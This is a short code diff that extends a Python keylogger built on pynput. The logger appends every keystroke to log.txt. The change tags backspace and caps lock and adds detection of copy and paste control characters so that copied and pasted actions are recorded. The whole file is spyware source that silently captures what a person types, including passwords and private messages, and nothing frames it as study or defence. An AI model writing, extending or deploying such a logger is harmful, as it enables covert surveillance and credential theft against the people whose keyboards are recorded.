@@ -4,18 +4,24 @@ from pynput.keyboard import Listener
 def log_keystroke(key):
     key = str(key).replace("'", "")
 
+    #check if a "special" key is pressed and only add what could be useful
     if key.startswith("Key."):
         if key == "Key.backspace":
-            key = ' BACKSPACE '
+            key = ' $BACKSPACE '
         elif key == 'Key.space':
             key = ' '
         elif key == "Key.enter":
             key = '\n'
         elif key == 'Key.caps_lock':
-            key = ' CAPS_LOCKED '
+            key = ' $CAPS_LOCKED '
         else:
             key = ''
-
+    #check if the user is copy-pasting some text
+    if key == "\\x03":
+        key = ' $COPY'
+    if key == "\\x16":
+        key = ' $PASTE'
+    
     with open("log.txt", 'a') as f:
         f.write(key)
 
